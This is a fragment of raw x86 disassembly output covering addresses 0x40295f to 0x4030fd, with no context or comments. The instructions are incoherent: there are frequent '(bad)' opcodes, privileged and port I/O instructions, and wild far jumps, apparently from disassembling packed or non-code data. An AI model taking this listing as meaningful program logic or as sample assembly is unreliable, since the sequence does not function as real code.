  40295f:	sbb    eax,0x4f0fbe6e
  402964:	xchg   DWORD PTR [eax-0x4d924283],eax
  40296a:	push   ebx
  40296b:	mov    cl,0x30
  40296d:	mov    ch,0x17
  40296f:	retf   0x4bb8
  402972:	mov    cl,BYTE PTR [edx-0x442ee733]
  402978:	jp     0x402992
  40297a:	jmp    0x402911
  40297c:	add    eax,0xe6091d49
  402981:	jo     0x402977
  402983:	and    al,0x16
  402985:	adc    dl,bh
  402987:	data16 repz out 0x2b,al
  40298b:	cmp    dl,BYTE PTR [eax]
  40298d:	dec    edi
  40298e:	mov    ecx,0xacf61386
  402993:	ja     0x40299e
  402995:	push   edx
  402996:	fstp   TBYTE PTR [ebx+0x4]
  402999:	sahf   
  40299a:	mov    ecx,esi
  40299c:	gs xchg al,cl
  40299f:	or     DWORD PTR [edx],esi
  4029a1:	and    bh,BYTE PTR [eax-0x4e]
  4029a4:	(bad)  
  4029a5:	sahf   
  4029a6:	jmp    0xebdb:0xc9516e5
  4029ad:	gs mov ch,al
  4029b0:	(bad)  
  4029b1:	daa    
  4029b2:	test   BYTE PTR [ebx],0x17
  4029b5:	sbb    eax,0x6f6da883
  4029ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029bb:	ret    0x5bd2
  4029be:	nop
  4029bf:	les    edx,FWORD PTR [ecx]
  4029c1:	icebp  
  4029c2:	stos   DWORD PTR es:[edi],eax
  4029c3:	leave  
  4029c4:	xchg   DWORD PTR ds:0xc6ec1484,esp
  4029ca:	shr    esi,cl
  4029cc:	mov    ebx,0x512da3d6
  4029d1:	push   esi
  4029d2:	and    DWORD PTR [ecx-0x39],ebp
  4029d5:	adc    BYTE PTR [ebx],ch
  4029d7:	div    ebx
  4029d9:	sbb    esi,DWORD PTR [esi-0x125d4cbc]
  4029df:	or     BYTE PTR [edx-0x70],dl
  4029e2:	in     al,0xda
  4029e4:	nop
  4029e5:	fs or  edx,0x39e7d1c6
  4029ec:	dec    edi
  4029ed:	retf   
  4029ee:	jl     0x402a48
  4029f0:	int    0x12
  4029f2:	pop    es
  4029f3:	daa    
  4029f4:	cmp    BYTE PTR [ebp+0x2b8911f7],dh
  4029fa:	mov    bh,0xbc
  4029fc:	push   ss
  4029fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029fe:	xor    bh,BYTE PTR [esi]
  402a00:	adc    esp,DWORD PTR [edx]
  402a02:	shr    BYTE PTR cs:[ebp-0x3ede2fd1],0xa7
  402a0a:	in     eax,0x9b
  402a0c:	scas   eax,DWORD PTR es:[edi]
  402a0d:	out    dx,eax
  402a0e:	fidivr WORD PTR [ecx]
  402a10:	xchg   ecx,eax
  402a11:	mov    bl,0x3e
  402a13:	rcr    DWORD PTR [eax+0x23],1
  402a16:	adc    al,0x4c
  402a18:	push   ecx
  402a19:	in     eax,dx
  402a1a:	xlat   BYTE PTR ds:[ebx]
  402a1b:	(bad)  
  402a1c:	shl    BYTE PTR [eax-0x5607f841],0x31
  402a23:	adc    DWORD PTR [edi-0x4a],ebx
  402a26:	xchg   esp,eax
  402a27:	scas   al,BYTE PTR es:[edi]
  402a28:	in     eax,dx
  402a29:	sbb    BYTE PTR [ebx],ch
  402a2b:	pushf  
  402a2c:	sub    eax,edi
  402a2e:	push   cs
  402a2f:	cmp    eax,0x97affde4
  402a34:	ret    0x36e7
  402a37:	pop    esi
  402a38:	push   esp
  402a39:	mov    al,0x62
  402a3b:	cmp    esp,DWORD PTR [ebp+0x4886fcc1]
  402a41:	inc    ecx
  402a42:	test   al,0xee
  402a44:	xlat   BYTE PTR ds:[ebx]
  402a45:	test   BYTE PTR [edi-0x3d],dh
  402a48:	into   
  402a49:	(bad)  
  402a4a:	(bad)  
  402a4b:	push   edi
  402a4c:	cmc    
  402a4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a4e:	push   esi
  402a4f:	inc    DWORD PTR [esi-0x69f75a00]
  402a55:	mov    edi,0x29bc7095
  402a5a:	retf   
  402a5b:	hlt    
  402a5c:	cwde   
  402a5d:	pop    edi
  402a5e:	mov    esp,0xaf29cf03
  402a63:	dec    esi
  402a64:	inc    edi
  402a65:	pusha  
  402a66:	fcmovu st,st(7)
  402a68:	xchg   esp,eax
  402a69:	shl    DWORD PTR [eax],1
  402a6b:	int3   
  402a6c:	popf   
  402a6d:	adc    DWORD PTR [ebx+0x5c201964],ebp
  402a73:	sbb    dl,dl
  402a75:	in     eax,0xff
  402a77:	pop    es
  402a78:	adc    al,0x58
  402a7a:	fisttp WORD PTR [edi+eax*2]
  402a7d:	xlat   BYTE PTR ds:[ebx]
  402a7e:	pushf  
  402a7f:	jl     0x402a22
  402a81:	ret    
  402a82:	inc    esi
  402a83:	xor    DWORD PTR [ebp+0x48],0xfc7774f9
  402a8a:	fild   QWORD PTR [esi-0x2a]
  402a8d:	sub    BYTE PTR [ecx],bh
  402a8f:	sbb    eax,0x16462550
  402a94:	and    al,BYTE PTR [eax]
  402a96:	bnd ret 0x62b0
  402a9a:	inc    eax
  402a9b:	pop    ds
  402a9c:	enter  0x9ce,0xef
  402aa0:	stc    
  402aa1:	cs add al,0x72
  402aa4:	test   al,0x2
  402aa6:	fbld   TBYTE PTR [esi+eiz*2+0x7ce0d5e6]
  402aad:	mov    DWORD PTR [esi+0x2e],edi
  402ab0:	lods   al,BYTE PTR ds:[esi]
  402ab1:	in     al,0xb6
  402ab3:	aad    0x82
  402ab5:	add    ecx,ebp
  402ab7:	inc    esi
  402ab8:	adc    al,0xf9
  402aba:	jae    0x402aa2
  402abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402abd:	pop    esp
  402abe:	stos   BYTE PTR es:[edi],al
  402abf:	mov    cl,0xe6
  402ac1:	inc    edi
  402ac2:	daa    
  402ac3:	xor    al,0x7e
  402ac5:	xor    edx,DWORD PTR [ecx-0x2863dfe7]
  402acb:	cwde   
  402acc:	jmp    0x402a78
  402ace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402acf:	mov    eax,0x7d16b07b
  402ad4:	push   ebp
  402ad5:	sub    eax,0x8f583df2
  402ada:	les    esi,FWORD PTR [esi-0x19ee1e0a]
  402ae0:	dec    eax
  402ae1:	add    bh,BYTE PTR [esi]
  402ae3:	cmp    DWORD PTR [esi-0x22],edi
  402ae6:	jmp    0xffa6:0x5a177540
  402aed:	jae    0x402af4
  402aef:	cli    
  402af0:	pusha  
  402af1:	js     0x402a84
  402af3:	lds    ecx,FWORD PTR [ebx+eiz*8-0x2b]
  402af7:	leave  
  402af8:	test   esp,ecx
  402afa:	loope  0x402a89
  402afc:	inc    edx
  402afd:	cli    
  402afe:	(bad)  
  402b00:	or     al,0xed
  402b02:	sbb    BYTE PTR [ecx-0x51],dh
  402b05:	mov    ebx,0xdca13ad5
  402b0a:	inc    edx
  402b0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b0c:	jmp    0x402aa1
  402b0e:	jmp    0x402b66
  402b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b11:	repz cmp eax,DWORD PTR [ecx+edx*1+0x1be57996]
  402b19:	sbb    DWORD PTR [eax-0x44ecb604],esi
  402b1f:	repnz xchg cl,ch
  402b22:	mov    edx,DWORD PTR ds:0xf0d54954
  402b28:	xchg   esp,eax
  402b29:	sbb    bl,BYTE PTR [ebx+0x71cce9a3]
  402b2f:	fld    DWORD PTR [eax+0x7cb38df7]
  402b35:	xor    DWORD PTR [ebp-0x5d],edi
  402b38:	xlat   BYTE PTR ds:[ebx]
  402b39:	fadd   DWORD PTR [edi-0x4d130a59]
  402b3f:	push   es
  402b40:	dec    ebp
  402b41:	dec    edx
  402b42:	test   eax,esp
  402b44:	test   DWORD PTR [edx+ecx*1+0x23],esp
  402b48:	add    bl,dh
  402b4a:	lahf   
  402b4b:	inc    esp
  402b4c:	repnz sbb eax,0xb80802ec
  402b52:	and    eax,0x9f26e1a4
  402b57:	cmp    eax,0xd0498350
  402b5c:	mov    DWORD PTR [esi+0x64],ebx
  402b5f:	add    al,BYTE PTR [ebx]
  402b61:	aas    
  402b62:	test   BYTE PTR [ebx+0xe082b24],ch
  402b68:	or     al,0x1b
  402b6a:	or     eax,DWORD PTR [edi]
  402b6c:	call   DWORD PTR [ecx-0x7e]
  402b6f:	mov    edi,0x3e88ddf
  402b74:	mov    ebp,DWORD PTR [ebx+ecx*4]
  402b77:	hlt    
  402b78:	js     0x402b64
  402b7a:	pop    eax
  402b7b:	repnz ror dh,cl
  402b7e:	mov    ch,0xaf
  402b80:	pop    esi
  402b81:	outs   dx,BYTE PTR ds:[esi]
  402b82:	jne    0x402b38
  402b84:	retf   
  402b85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b86:	(bad)  
  402b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b88:	rol    BYTE PTR [eax],cl
  402b8a:	add    al,0x96
  402b8c:	add    al,0xca
  402b8e:	lds    ebx,FWORD PTR [edi]
  402b90:	arpl   WORD PTR [bx+si+0x77],si
  402b94:	cmc    
  402b95:	fadd   st(3),st
  402b97:	sbb    BYTE PTR [eax+0x17],al
  402b9a:	loopne 0x402b54
  402b9c:	test   BYTE PTR gs:[edx+0x7e44b0c9],0xc8
  402ba4:	xchg   DWORD PTR ds:0xb9d16140,eax
  402baa:	or     al,0x98
  402bac:	nop
  402bad:	xchg   ebp,eax
  402bae:	fidiv  DWORD PTR [edi]
  402bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bb1:	push   0xe7fda18e
  402bb6:	jmp    0x8d11027a
  402bbb:	and    DWORD PTR [ebp+0x20],0x5c14ed57
  402bc2:	cmp    DWORD PTR [ebp+0x5ad6533],esi
  402bc8:	inc    esi
  402bc9:	mov    al,0x22
  402bcb:	out    dx,al
  402bcc:	lods   eax,DWORD PTR ds:[esi]
  402bcd:	imul   edx,ebx,0x3b
  402bd0:	pop    es
  402bd1:	push   esi
  402bd2:	lea    eax,[ebp+0x40]
  402bd5:	dec    ebx
  402bd6:	aaa    
  402bd7:	sbb    DWORD PTR [esi],esi
  402bd9:	sub    DWORD PTR [edi+0x3d5c013f],0xffffffcc
  402be0:	mov    BYTE PTR [edx+ebp*1],dl
  402be3:	call   0x8c25:0xb6ffa56d
  402bea:	mov    esp,cs
  402bec:	adc    BYTE PTR ds:0x48ad4d16,0x6f
  402bf3:	in     al,0x21
  402bf5:	xor    ebx,DWORD PTR [edi-0x57]
  402bf8:	cli    
  402bf9:	mov    eax,ds:0xa8593e36
  402bfe:	inc    edx
  402bff:	jo     0x402bcc
  402c01:	rcr    ebp,0x20
  402c04:	push   cs
  402c05:	cli    
  402c06:	test   eax,0xbd09ad0f
  402c0b:	push   ebp
  402c0c:	sub    DWORD PTR [esi-0x5ab7673a],esi
  402c12:	mov    bl,0x1d
  402c14:	xor    ecx,ebx
  402c16:	mov    ebx,0x2edb6279
  402c1b:	jnp    0x402bed
  402c1d:	pop    ebx
  402c1e:	jmp    0xb4c7:0x6d84aff3
  402c25:	add    al,0xa6
  402c27:	ja     0x402c91
  402c29:	in     eax,0x88
  402c2b:	push   ebp
  402c2c:	out    0x34,eax
  402c2e:	stc    
  402c2f:	mov    bh,0x6c
  402c31:	cmc    
  402c32:	sub    eax,0x5d08d97c
  402c37:	imul   esi,DWORD PTR [ebx-0x7d],0xb6058fba
  402c3e:	sar    BYTE PTR [edx+edi*2+0x4],cl
  402c42:	or     DWORD PTR [ecx],edx
  402c44:	mov    edx,0xf043c66d
  402c49:	out    dx,al
  402c4a:	xor    BYTE PTR [ebx],cl
  402c4c:	add    eax,0x949651cc
  402c51:	sub    al,0xf
  402c53:	test   al,0x13
  402c55:	mov    bl,0xeb
  402c57:	jge    0x402c6a
  402c59:	adc    DWORD PTR [eax+0x695c40a8],ebp
  402c5f:	(bad)  
  402c60:	mov    eax,ds:0x9a89f705
  402c65:	addr16 push ebp
  402c67:	xor    esp,eax
  402c69:	xlat   BYTE PTR ds:[ebx]
  402c6a:	jbe    0x402c54
  402c6c:	adc    DWORD PTR [ebx+0x29b68c1],edi
  402c72:	pop    ebx
  402c73:	popf   
  402c74:	mov    dh,0xbc
  402c76:	mov    ch,0x3d
  402c78:	jnp    0x402c5d
  402c7a:	mov    eax,ds:0xcd0c6be9
  402c7f:	outs   dx,DWORD PTR ds:[esi]
  402c80:	call   0xd503612c
  402c85:	mov    edx,0x3260c66a
  402c8a:	sti    
  402c8b:	xchg   DWORD PTR [esp+eax*2+0x8],edi
  402c8f:	adc    dh,BYTE PTR [ebx-0x1163e302]
  402c95:	sub    eax,0xed1fff4f
  402c9a:	mov    ebp,0x1711ebd5
  402c9f:	add    eax,0xa0744cb7
  402ca4:	fldcw  WORD PTR [ebx*4-0x3acb0a9d]
  402cab:	add    dh,dh
  402cad:	mov    ds:0x8382f5c3,eax
  402cb2:	fimul  DWORD PTR [ebx-0x148ddd5b]
  402cb8:	push   ebp
  402cb9:	adc    esp,DWORD PTR [ecx+0x17918c49]
  402cbf:	xchg   edx,eax
  402cc0:	lds    ebp,FWORD PTR [esi-0x48b15605]
  402cc6:	inc    eax
  402cc7:	lea    eax,ds:0x4e917280
  402ccd:	and    DWORD PTR ds:0xc7d61da6,0x299ab8a4
  402cd7:	mov    ecx,0xb7b10281
  402cdc:	into   
  402cdd:	sbb    ch,BYTE PTR [esi+edi*1-0x1a]
  402ce1:	mov    cs,WORD PTR [eax+0x48b05b7f]
  402ce7:	jne    0x402d32
  402ce9:	and    eax,DWORD PTR [esp+edi*4-0x20]
  402ced:	ins    BYTE PTR es:[edi],dx
  402cee:	sbb    al,0xe0
  402cf0:	jno    0x402c7f
  402cf2:	or     DWORD PTR [edi-0x3e],0x8514d013
  402cf9:	cmp    eax,0x6f0b9a9e
  402cfe:	pop    esi
  402cff:	es (bad) 
  402d01:	and    DWORD PTR [eax+0x35],eax
  402d04:	popa   
  402d05:	mov    ebp,0xe29a9a52
  402d0a:	imul   DWORD PTR [edi]
  402d0c:	stos   BYTE PTR es:[edi],al
  402d0d:	pushf  
  402d0e:	shr    dl,cl
  402d10:	faddp  st(0),st
  402d12:	test   DWORD PTR [edi+edx*1],ebx
  402d15:	dec    ecx
  402d16:	xor    DWORD PTR [edi-0x53913523],0x79
  402d1d:	or     bl,BYTE PTR [edx]
  402d1f:	xchg   ecx,eax
  402d20:	push   edx
  402d21:	mov    al,BYTE PTR [esp+ebp*4-0x4336d500]
  402d28:	sbb    esp,DWORD PTR [edx-0x16e19b62]
  402d2e:	mov    ds:0xc190eb17,eax
  402d33:	xor    cl,0x66
  402d36:	ins    BYTE PTR es:[edi],dx
  402d37:	daa    
  402d38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d39:	outs   dx,BYTE PTR ds:[esi]
  402d3a:	or     ebp,ecx
  402d3c:	dec    esp
  402d3d:	or     eax,0x933171b9
  402d42:	xor    al,0x36
  402d44:	jbe    0x402db3
  402d46:	jne    0x402d34
  402d48:	(bad)  
  402d4a:	add    dl,al
  402d4c:	mov    ah,0x6d
  402d4e:	xchg   esi,eax
  402d4f:	xlat   BYTE PTR ds:[ebx]
  402d50:	dec    DWORD PTR [eax+0x2]
  402d53:	inc    esp
  402d54:	adc    BYTE PTR [edx+0x62b75dfd],dh
  402d5a:	adc    DWORD PTR [edi],eax
  402d5c:	popf   
  402d5d:	cli    
  402d5e:	mov    eax,0xcf52e864
  402d63:	int3   
  402d64:	mov    dh,0x9d
  402d66:	mov    esi,0xf506b5fe
  402d6b:	add    cl,BYTE PTR [eax-0x33408ee5]
  402d71:	jle    0x402d39
  402d73:	xchg   edx,eax
  402d74:	adc    DWORD PTR [ecx-0x3a],ebp
  402d77:	jmp    FWORD PTR [ecx+eax*1-0x56e1c927]
  402d7e:	push   0xffffffc1
  402d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d81:	push   esp
  402d82:	fldl2e 
  402d84:	add    ebx,DWORD PTR [eax-0x27]
  402d87:	mov    dl,0xf
  402d89:	aaa    
  402d8a:	xchg   esp,eax
  402d8b:	ins    BYTE PTR es:[edi],dx
  402d8c:	(bad)  
  402d8d:	jecxz  0x402d57
  402d8f:	lahf   
  402d90:	adc    al,0x8b
  402d92:	mov    al,0x3e
  402d94:	push   esp
  402d95:	call   FWORD PTR [edx+0x66]
  402d98:	dec    ecx
  402d99:	xchg   ebp,eax
  402d9a:	in     eax,dx
  402d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d9c:	adc    eax,0xed1379e9
  402da1:	adc    edx,ebx
  402da3:	dec    edx
  402da4:	xchg   ecx,eax
  402da5:	aas    
  402da6:	jmp    0x402d8a
  402da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402da9:	jo     0x402dae
  402dab:	mov    ds:0x93174557,eax
  402db0:	add    BYTE PTR [ebp-0x54bdd7e4],bh
  402db6:	sub    BYTE PTR [eax],ch
  402db8:	imul   ebx,DWORD PTR [ecx],0xe6ffbdc1
  402dbe:	arpl   WORD PTR [ecx-0x645281fb],cx
  402dc4:	hlt    
  402dc5:	in     eax,dx
  402dc6:	outs   dx,DWORD PTR ds:[esi]
  402dc7:	push   ds
  402dc8:	push   cs
  402dc9:	mov    ebp,DWORD PTR ds:0x80cf98dd
  402dcf:	imul   eax,DWORD PTR [eax],0x7d
  402dd2:	dec    esi
  402dd3:	mov    bh,0x5b
  402dd5:	sub    eax,0xb5fba9aa
  402dda:	adc    al,dh
  402ddc:	mov    ecx,0xb8f2078f
  402de1:	and    BYTE PTR [edi+0x54],bl
  402de4:	lahf   
  402de5:	pop    eax
  402de6:	fdivr  QWORD PTR [ecx]
  402de8:	div    DWORD PTR [edx+edi*8]
  402deb:	jg     0x402e06
  402ded:	int3   
  402dee:	enter  0xcde8,0xc8
  402df2:	arpl   WORD PTR [ecx-0x35e993c7],si
  402df8:	pusha  
  402df9:	and    bl,BYTE PTR [edi+0x72]
  402dfc:	jne    0x402e43
  402dfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dff:	ret    0x743
  402e02:	xor    eax,0x793298e9
  402e07:	sub    DWORD PTR [ebx+0x4e],edi
  402e0a:	sbb    eax,0xc307da84
  402e0f:	push   ebp
  402e10:	int3   
  402e11:	gs dec eax
  402e13:	jecxz  0x402dd0
  402e15:	sbb    edx,ebp
  402e17:	out    0xb9,al
  402e19:	lea    ebx,[ebx+0x5901f5f1]
  402e1f:	je     0x402e2e
  402e21:	mov    ds:0x5f1743af,al
  402e26:	iret   
  402e27:	push   cs
  402e28:	lea    esi,[edi+0x12]
  402e2b:	out    0x6a,al
  402e2d:	mov    bl,0xc8
  402e2f:	add    DWORD PTR [edx+0x3f],0x20
  402e33:	mov    edi,0xe3ef2abe
  402e38:	fnstsw WORD PTR [edx+0x7c011bc8]
  402e3e:	je     0x402e13
  402e40:	cmp    al,0x74
  402e42:	aad    0xe6
  402e44:	and    eax,0x8e930b37
  402e49:	jl     0x402e6b
  402e4b:	and    cl,BYTE PTR [ebx+0x42]
  402e4e:	xor    BYTE PTR [edi+0x55],0x64
  402e52:	fmul   QWORD PTR [edx-0x2e649fc5]
  402e58:	test   eax,0xab67ba34
  402e5d:	sbb    ecx,DWORD PTR [edi+edi*4]
  402e60:	jecxz  0x402e3d
  402e62:	out    dx,al
  402e63:	daa    
  402e64:	shl    DWORD PTR [esi-0x57],0xe6
  402e68:	js     0x402ecd
  402e6a:	les    eax,FWORD PTR [esi]
  402e6c:	icebp  
  402e6d:	xchg   ebp,eax
  402e6e:	test   edi,esi
  402e70:	loopne 0x402ef0
  402e72:	sahf   
  402e73:	xchg   ebp,eax
  402e74:	xor    ah,dh
  402e76:	dec    eax
  402e77:	xchg   edi,eax
  402e78:	rcl    BYTE PTR [edi-0x4027e478],cl
  402e7e:	sbb    al,0xe8
  402e80:	sub    BYTE PTR [ecx],dl
  402e82:	sar    BYTE PTR [ebp+0x6587204f],1
  402e88:	and    ch,BYTE PTR [edx+edx*2+0x35]
  402e8c:	add    al,0x3a
  402e8e:	inc    ecx
  402e8f:	push   ecx
  402e90:	and    DWORD PTR [ebx+0x67],ecx
  402e93:	cld    
  402e94:	add    DWORD PTR [ebx-0x730a4c06],edi
  402e9a:	int3   
  402e9b:	push   ss
  402e9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e9d:	dec    edx
  402e9e:	cdq    
  402e9f:	retf   0xa76a
  402ea2:	pop    esp
  402ea3:	pop    es
  402ea4:	dec    ebx
  402ea5:	add    eax,0x2e8ef345
  402eaa:	aad    0x6b
  402eac:	sbb    eax,0x9541e983
  402eb1:	inc    ecx
  402eb2:	inc    ecx
  402eb3:	mov    dh,0xd1
  402eb5:	pop    es
  402eb6:	jg     0x402f29
  402eb8:	cs cmp al,0x65
  402ebb:	pop    ss
  402ebc:	sub    DWORD PTR [esi+0x60],eax
  402ebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ec0:	or     al,0x1a
  402ec2:	dec    ecx
  402ec3:	inc    esp
  402ec4:	cwde   
  402ec5:	mov    ebx,DWORD PTR [edx+0x35]
  402ec8:	xor    BYTE PTR [eax+edi*8-0x9],ch
  402ecc:	add    BYTE PTR [esi-0x4cce3374],cl
  402ed2:	jmp    0xfc9:0x194b626c
  402ed9:	inc    ecx
  402eda:	gs jae 0x402f1b
  402edd:	jb     0x402efc
  402edf:	mov    ds:0xe3f7f247,al
  402ee4:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  402ee6:	bound  ecx,QWORD PTR [edi+0x3f221774]
  402eec:	push   esi
  402eed:	outs   dx,DWORD PTR ds:[esi]
  402eee:	jl     0x402efb
  402ef0:	(bad)  
  402ef1:	icebp  
  402ef2:	or     eax,0x27f9febf
  402ef7:	loop   0x402f78
  402ef9:	inc    edi
  402efa:	hlt    
  402efb:	iret   
  402efc:	mov    edi,DWORD PTR [ebx+0x12]
  402eff:	fsub   DWORD PTR [ecx]
  402f01:	arpl   dx,bx
  402f03:	jnp    0x402ed9
  402f05:	sbb    bh,BYTE PTR [esp+edi*1+0x516a2ea5]
  402f0c:	xor    al,0x75
  402f0e:	adc    bl,al
  402f10:	sub    dl,BYTE PTR ds:0xa1b5c008
  402f16:	iret   
  402f17:	dec    ecx
  402f18:	dec    ebp
  402f19:	sbb    BYTE PTR [esi+esi*8+0x5d1ab03e],ah
  402f20:	push   ds
  402f21:	inc    ecx
  402f22:	or     esi,ebp
  402f24:	push   es
  402f25:	stc    
  402f26:	inc    eax
  402f27:	mov    edx,0x3d9ddfba
  402f2c:	(bad)  
  402f2d:	aad    0x14
  402f2f:	or     al,0xf9
  402f31:	xchg   esi,eax
  402f32:	sub    ch,BYTE PTR [eax]
  402f34:	pop    esi
  402f35:	mov    ah,0xd8
  402f37:	test   DWORD PTR [edi],edi
  402f39:	mov    WORD PTR [esp+edi*4+0x69],cs
  402f3d:	into   
  402f3e:	(bad)  
  402f3f:	shr    edx,0x49
  402f42:	or     BYTE PTR [eax+0x6a],0xc0
  402f46:	ficom  WORD PTR [edi+0x5101c5a1]
  402f4c:	std    
  402f4d:	cdq    
  402f4e:	and    bh,cl
  402f50:	imul   ebp,DWORD PTR [eax+ebp*1],0x3e
  402f54:	inc    ebx
  402f55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f56:	aam    0x6f
  402f58:	push   ss
  402f59:	dec    ecx
  402f5a:	jbe    0x402fbf
  402f5c:	add    DWORD PTR [ecx+0x5843ad7c],edx
  402f62:	mov    edi,0x8900a91f
  402f67:	mov    WORD PTR [ebp-0x37],?
  402f6a:	xchg   ebp,eax
  402f6b:	or     eax,0x3db8bb7
  402f70:	xor    ebx,DWORD PTR [ebp+0x7]
  402f73:	xchg   BYTE PTR [eax],bl
  402f75:	pop    ebx
  402f76:	dec    ecx
  402f77:	add    al,BYTE PTR [ebx-0x1]
  402f7a:	gs adc al,0x3b
  402f7d:	ds gs mov esi,0x8fd6a612
  402f84:	shl    DWORD PTR [ebx+0x70],1
  402f87:	dec    esi
  402f88:	shr    BYTE PTR [eax+0xc],0xdb
  402f8c:	add    eax,0xcd005336
  402f91:	or     dl,BYTE PTR [edi+ebx*8]
  402f94:	or     DWORD PTR [edx+0x50],edi
  402f97:	leave  
  402f98:	mov    ah,al
  402f9a:	ficomp DWORD PTR [eax+0x224bb4ee]
  402fa0:	xor    edi,DWORD PTR [esi+0x28]
  402fa3:	faddp  st(2),st
  402fa5:	xor    DWORD PTR [eax+0x1],ecx
  402fa8:	and    bh,BYTE PTR [ebp+0x5daa2203]
  402fae:	stc    
  402faf:	jge    0x403013
  402fb1:	test   BYTE PTR [esi-0x4def8222],0x87
  402fb8:	addr16 test al,0x1d
  402fbb:	pushf  
  402fbc:	jns    0x402f7f
  402fbe:	pop    edx
  402fbf:	or     DWORD PTR [ebx+0x36],ebp
  402fc2:	or     BYTE PTR [edi+0x2dd32f0],0x75
  402fc9:	xor    dh,ah
  402fcb:	and    eax,0xefeb98ac
  402fd0:	fs stos BYTE PTR es:[edi],al
  402fd2:	sub    al,0x5b
  402fd4:	pop    edx
  402fd5:	fadd   QWORD PTR [ecx-0xc]
  402fd8:	stos   BYTE PTR es:[edi],al
  402fd9:	mov    DWORD PTR [ebp+0x3ed91d37],edi
  402fdf:	xchg   ebp,eax
  402fe0:	xchg   BYTE PTR [ebx-0x59ac42c],bh
  402fe6:	daa    
  402fe7:	cs inc esp
  402fe9:	and    eax,0x32894e58
  402fee:	xlat   BYTE PTR ds:[ebx]
  402fef:	mov    al,BYTE PTR [esi]
  402ff1:	sar    DWORD PTR [edx+eax*1+0x58bfbf55],1
  402ff8:	(bad)  
  402ff9:	fs push cs
  402ffb:	pop    esi
  402ffc:	sbb    DWORD PTR [esi],eax
  402ffe:	and    BYTE PTR [edi],0x2a
  403001:	sub    ecx,DWORD PTR ds:0x26cc358c
  403007:	stos   DWORD PTR es:[edi],eax
  403008:	test   al,0x14
  40300a:	mov    al,ds:0x2052077a
  40300f:	aam    0x62
  403011:	out    dx,al
  403012:	repnz hlt 
  403014:	push   ss
  403015:	idiv   eax
  403017:	fs pop es
  403019:	mov    bh,0x80
  40301b:	test   eax,0x771d0b47
  403020:	xchg   edx,eax
  403021:	int3   
  403022:	dec    eax
  403023:	and    ah,bl
  403025:	pop    ds
  403026:	adc    al,BYTE PTR [esi]
  403028:	cdq    
  403029:	rcl    BYTE PTR [esi-0x7b0f3f63],1
  40302f:	(bad)  
  403030:	fstp   st(3)
  403032:	int3   
  403033:	jns    0x40305d
  403035:	aam    0x36
  403037:	in     al,dx
  403038:	cmp    dl,BYTE PTR [ecx+ebx*2]
  40303b:	into   
  40303c:	out    dx,al
  40303d:	cli    
  40303e:	add    al,0x74
  403040:	pop    ds
  403041:	fs push edx
  403043:	add    eax,0xd6dce29d
  403048:	inc    ecx
  403049:	push   eax
  40304a:	sub    al,0x34
  40304c:	loope  0x403055
  40304e:	add    al,BYTE PTR [esp+edi*1+0x4]
  403052:	pop    edi
  403053:	cli    
  403054:	mov    ecx,0xf7a0461c
  403059:	cli    
  40305a:	mov    esi,0x3f99423a
  40305f:	mov    bl,0xea
  403061:	sub    al,0x37
  403063:	shr    DWORD PTR [ecx+0x1a9462d4],cl
  403069:	das    
  40306a:	cdq    
  40306b:	push   0x59bcb869
  403070:	xchg   edx,eax
  403071:	daa    
  403072:	sub    al,0x41
  403074:	fmul   QWORD PTR [edx-0xcf432b5]
  40307a:	or     BYTE PTR [ebx+0x39],dl
  40307d:	mov    dl,0xc0
  40307f:	inc    esp
  403080:	repnz mov edx,0x578583de
  403086:	cli    
  403087:	add    al,0x36
  403089:	(bad)  
  40308a:	xchg   esi,eax
  40308b:	les    esi,FWORD PTR fs:[esi-0x7e]
  40308f:	jp     0x403092
  403091:	mov    eax,ds:0xc1c2c40b
  403096:	xchg   BYTE PTR [edx],bh
  403098:	push   eax
  403099:	lds    eax,FWORD PTR [edi+0xf7a2db9]
  40309f:	les    esi,FWORD PTR [ebx-0x49]
  4030a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030a3:	mov    edi,0x1989133a
  4030a8:	repnz ins DWORD PTR es:[edi],dx
  4030aa:	pop    esi
  4030ab:	mov    ebx,0x7bd3b372
  4030b0:	das    
  4030b1:	jnp    0x40312c
  4030b3:	push   ds
  4030b4:	popa   
  4030b5:	in     al,dx
  4030b6:	mov    al,ds:0x66b7b95c
  4030bb:	pop    ebp
  4030bc:	stos   DWORD PTR es:[edi],eax
  4030bd:	add    BYTE PTR [ecx+0x18],ah
  4030c0:	ins    DWORD PTR es:[edi],dx
  4030c1:	pop    edx
  4030c2:	(bad)
  4030c5:	lea    eax,[eax]
  4030c7:	ins    BYTE PTR es:[edi],dx
  4030c8:	popa   
  4030c9:	inc    esp
  4030ca:	cs inc edx
  4030cc:	mov    cl,0xe6
  4030ce:	jmp    0x40313c
  4030d0:	jb     0x4030fa
  4030d2:	pop    ecx
  4030d3:	in     eax,0x6e
  4030d5:	fdiv   QWORD PTR [ebp+0x3f]
  4030d8:	lock fs pop ss
  4030db:	mov    esi,0x2bd1959a
  4030e0:	pop    esp
  4030e1:	out    0x66,al
  4030e3:	icebp  
  4030e4:	jmp    0x403080
  4030e6:	aam    0xb8
  4030e8:	sub    esi,esi
  4030ea:	xchg   DWORD PTR [ebx],esi
  4030ec:	adc    DWORD PTR ds:0x3237ac49,esp
  4030f2:	mov    cl,0x82
  4030f4:	xchg   ebp,eax
  4030f5:	push   esi
  4030f6:	adc    BYTE PTR ds:0x8603b0,ch
  4030fc:	dec    ebx
  4030fd:	inc    ebp
